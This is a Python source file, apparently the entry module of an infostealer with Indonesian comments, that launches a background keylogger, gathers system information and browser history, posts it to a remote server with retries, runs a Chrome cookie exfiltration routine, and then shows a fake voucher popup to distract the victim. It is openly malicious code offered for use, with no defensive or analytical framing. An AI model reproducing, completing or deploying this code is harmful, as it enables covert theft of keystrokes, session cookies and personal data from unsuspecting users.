import threading
import time
import requests
from .keylogger import start_keylogger
from .system_info import collect_and_send_system_info
from .voucher_launcher import show_message as show_voucher
from .chrome_cookie import run_cookie_exfiltration

def send_data_with_retry(url, payload, max_retries=3, delay=5):
  for attempt in range(1, max_retries + 1):
    try:
      response = requests.post(url, json=payload, timeout=5)
      if response.status_code == 200:
        print(f"[+] Data sent successfully on attempt {attempt}")
        return True
      else:
        print(f"[!] Server merespons {response.status_code}, coba ulang...")
    except Exception as e:
      print(f"[!] Gagal koneksi ke {url}: {e}")
    time.sleep(delay)
  print(f"[!] Gagal mengirim data setelah {max_retries} percobaan")
  return False

def run_all_payload():
  try:
    # start keylogger di backgroud
    keylog_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylog_thread.start()
  
    # kirim data sistem + browser history
    system_data = collect_and_send_system_info(return_data=True)
    send_data_with_retry(system_data['url'], system_data['payload'])
    
    run_cookie_exfiltration()  # Eksekusi pengambilan cookie Chrome
  
    # Tampilkan popup ke user
    show_voucher()
  except Exception as e:
    print(f"[!] Error in run_all_payload: {e}")
    
if __name__ == "__main__":
  run_all_payload()